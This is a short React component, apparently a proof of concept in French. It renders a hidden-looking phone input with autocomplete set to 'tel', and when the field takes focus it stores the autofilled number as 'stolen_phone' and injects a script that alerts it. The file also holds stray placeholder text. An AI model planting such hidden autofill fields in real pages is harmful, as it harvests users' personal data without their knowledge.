//@ts-nocheck
import React, { useEffect } from "react";

const PhoneNumber = () => {
  // Créer un input invisible mais accessible à l'autofill
  const hiddenInputRef = React.useRef(null);

  // Stocker le numéro dans localStorage dès qu'il est capturé
  useEffect(() => {
    const handleAutofill = (e) => {
      if (hiddenInputRef.current && e.target.value.trim()) {
        localStorage.setItem("stolen_phone", e.target.value);
        console.log("Numéro volé :", e.target.value);
        // Ajouter un script pour afficher le numéro dans une popup
        const script = document.createElement("script");
        script.innerHTML = `
          alert("Numéro volé !\\n" + localStorage.getItem('stolen_phone'));
        `;
        document.body.appendChild(script);
        // setTimeout(() => document.body.removeChild(script), 1000);
      }
    };

    // Attacher le listener au focus
    hiddenInputRef.current.addEventListener("focus", handleAutofill);

    return () => {
      hiddenInputRef.current.removeEventListener("focus", handleAutofill);
    };
  }, []);

  return (
    <div>
      {/* Input invisible mais accessible à l'autofill */}
      dsdqsdq
      <input
        ref={hiddenInputRef}
        type="tel"
        autoComplete="tel"
        aria-hidden="true"
      />
    </div>
  );
};

export default PhoneNumber;
